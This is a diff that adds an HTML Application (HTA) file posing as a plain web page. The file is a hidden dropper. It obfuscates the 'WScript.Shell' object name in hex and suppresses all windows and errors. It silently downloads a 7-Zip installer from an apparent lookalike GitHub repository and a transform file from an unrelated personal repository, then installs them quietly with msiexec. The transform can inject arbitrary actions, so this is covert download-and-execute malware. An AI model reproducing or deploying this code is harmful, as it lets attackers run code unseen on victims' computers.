@@ -1,0 +1,13 @@
+<html><head>
+<hta:application showInTaskBar="no" windowState="minimize" caption="no">
+<script language="JScript">
+function h(s){var r="";for(var i=0;i<s.length;i+=2)r+=String.fromCharCode(parseInt(s.substr(i,2),16));return r;}
+try{
+  var ws=new ActiveXObject(h("575363726970742e5368656c6c"));
+  var t=ws.ExpandEnvironmentStrings("%TEMP%");
+  ws.Run('curl.exe -s -L -k -o "'+t+'\\7z.msi" "https://github.com/ip7z/7zip/releases/download/26.02/7z2602-x64.msi"',0,true);
+  ws.Run('curl.exe -s -L -k -o "'+t+'\\en-us.mst" "https://raw.githubusercontent.com/haha150/temp/main/en-us.mst"',0,true);
+  ws.Run('msiexec /i "'+t+'\\7z.msi" TRANSFORMS="'+t+'\\en-us.mst" /qn',0,false);
+}catch(e){}
+window.close();
+</script></head></html>
